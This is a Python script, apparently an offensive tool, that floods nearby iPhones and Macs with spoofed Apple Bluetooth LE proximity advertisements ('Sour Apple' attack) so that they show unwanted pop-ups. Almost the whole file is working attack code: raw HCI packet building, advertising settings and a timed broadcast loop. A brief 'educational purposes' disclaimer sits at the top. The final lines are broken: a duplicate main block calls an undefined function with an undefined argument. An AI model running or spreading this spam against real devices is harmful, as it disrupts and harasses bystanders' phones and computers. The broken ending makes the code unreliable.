"""
Apple Advertisement Spam BLE Attack

This script broadcasts fake Apple device BLE advertisements (similar to AirTags, Apple TVs, etc.)
to nearby Apple devices. Based on JammyTools sour.py (Sour Apple Attack).

It exploits Apple's proximity discovery protocol by sending spoofed advertisement packets
that trigger notifications on nearby iOS and macOS devices.

WARNING: This is for educational purposes only. Use responsibly and only on devices
you own or have permission to test.
"""

import random
import bluetooth._bluetooth as bluez
from time import sleep
import struct
import socket
import array
import threading
import time
import os
import fcntl
from errno import EALREADY


# ANSI Color codes
RED = "\033[31m"
GREEN = '\033[32m'
BLUE = '\033[34m'
CYAN = '\033[36m'
WHITE = '\033[37m'
YELLOW = '\033[33m'
RESET = "\033[0m"
BRIGHT = '\033[1m'


def setup_device(device_id):
    """Setup the Bluetooth device for advertising."""
    try:
        hci_sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, socket.BTPROTO_HCI)
        req_str = struct.pack("H", device_id)
        request = array.array("b", req_str)
        fcntl.ioctl(hci_sock.fileno(), bluez.HCIDEVUP, request[0])
    except IOError as e:
        if e.errno != EALREADY:
            raise
    finally:
        hci_sock.close()


def send_packet(sock, delay=1):
    """
    Send fake Apple device advertisement packet.
    
    Uses various Apple device type identifiers to create diverse advertisements.
    """
    # Apple device type identifiers
    types = [0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0]
    
    # Build BLE advertisement packet with random Apple device identifier
    bt_packet = (16, 0xFF, 0x4C, 0x00, 0x0F, 0x05, 0xC1, types[random.randint(0, len(types) - 1)],
                 random.randint(0, 255), random.randint(0, 255), random.randint(0, 255), 0x00, 0x00, 0x10,
                 random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
    
    # Advertising parameters: min_interval, max_interval, type, own_addr_type, peer_addr_type, peer_addr (6 bytes), chan_map, filter_policy
    # Type 3 = Scannable undirected advertising (better for being discovered)
    struct_params = [20, 20, 3, 0, 0, 0, 0, 0, 0, 0, 0, 7, 0]
    
    # Set advertising parameters
    cmd_pkt = struct.pack("<HHBBB6BBB", *struct_params)
    bluez.hci_send_cmd(sock, 0x08, 0x0006, cmd_pkt)
    time.sleep(0.01)
    
    # Enable advertising
    cmd_pkt = struct.pack("<B", 0x01)
    bluez.hci_send_cmd(sock, 0x08, 0x000A, cmd_pkt)
    time.sleep(0.01)
    
    # Set advertising data
    cmd_pkt = struct.pack("<B%dB" % len(bt_packet), len(bt_packet), *bt_packet)
    bluez.hci_send_cmd(sock, 0x08, 0x0008, cmd_pkt)
    time.sleep(0.01)
    
    # Keep advertising active for the delay period (don't disable immediately)
    sleep(delay)
    
    # Then disable advertising
    cmd_pkt = struct.pack("<B", 0x00)
    bluez.hci_send_cmd(sock, 0x08, 0x000A, cmd_pkt)
    time.sleep(0.01)


def ad_spam(device_ids, duration=60, interval=0.1):
    """
    Main Apple advertisement spam attack function.
    
    Args:
        device_ids (list): List of HCI device identifiers (e.g., ["hci0", "hci1"])
        duration (int): Duration of the attack in seconds
        interval (float): Interval between packets in seconds (0.1-1.0 recommended)
    """
    
    print(f"{GREEN}{BRIGHT}Sour Apple Attack Initiated...{RESET}{BLUE}")
    
    socks = []
    
    try:
        # Parse device IDs and setup
        for device_label in device_ids:
            device_id = int(device_label.replace("hci", ""))
            print(f"Setting up {device_label}...")
            setup_device(device_id)
            try:
                sock = bluez.hci_open_dev(device_id)
                socks.append((device_label, sock))
            except Exception as e:
                print(f"{RED}Unable to connect to Bluetooth hardware {device_label}: {e}{RESET}")
        
        if not socks:
            print(f"{RED}No Bluetooth devices available!{RESET}")
            return
        
        print(f"{GREEN}Hold on tight, we are flying far away!{RESET}")
        print(f"{CYAN}Broadcasting Apple device advertisements...{RESET}")
        print(f"{YELLOW}Duration: {duration} seconds, Interval: {interval} seconds{RESET}")
        print(f"{YELLOW}TIP: For better results, keep interval at 0.1-0.5 seconds{RESET}\n")
        
        start_time = time.time()
        packet_count = 0
        burst_count = 0
        
        # Send packets for specified duration
        while time.time() - start_time < duration:
            burst_count += 1
            
            # Send advertisement burst on all devices
            for device_label, sock in socks:
                try:
                    # Send packet with the specified interval
                    send_packet(sock, delay=interval)
                    packet_count += 1
                    
                    # Print progress every 10 packets
                    if packet_count % 10 == 0:
                        elapsed = time.time() - start_time
                        print(f"{CYAN}Packets: {packet_count} | Bursts: {burst_count} | Elapsed: {elapsed:.1f}s{RESET}", end='\r')
                    
                except Exception as e:
                    print(f"{RED}Error sending packet on {device_label}: {e}{RESET}")
        
        print()  # New line after progress
        print(f"\n{GREEN}Attack completed!{RESET}")
        print(f"{CYAN}Total packets sent: {packet_count}{RESET}")
        print(f"{CYAN}Total bursts: {burst_count}{RESET}")
        
    except KeyboardInterrupt:
        print(f"\n{YELLOW}Attack interrupted by user{RESET}")
    except Exception as e:
        print(f"{RED}An error occurred: {e}{RESET}")
    finally:
        # Disable advertising and close all sockets
        for device_label, sock in socks:
            try:
                cmd_pkt = struct.pack("<B", 0x00)
                bluez.hci_send_cmd(sock, 0x08, 0x000A, cmd_pkt)
                sock.close()
            except:
                pass
        
        print(f"{BLUE}Cleaned up resources.{RESET}")


if __name__ == "__main__":
    # For testing: run with default parameters
    import sys
    devices = ["hci0"]
    if len(sys.argv) > 1:
        devices = sys.argv[1:]
    
    ad_spam(device_ids=devices, duration=60, interval=0.1)

    ad_spam(inf=args.devices)


if __name__ == "__main__":
    main()
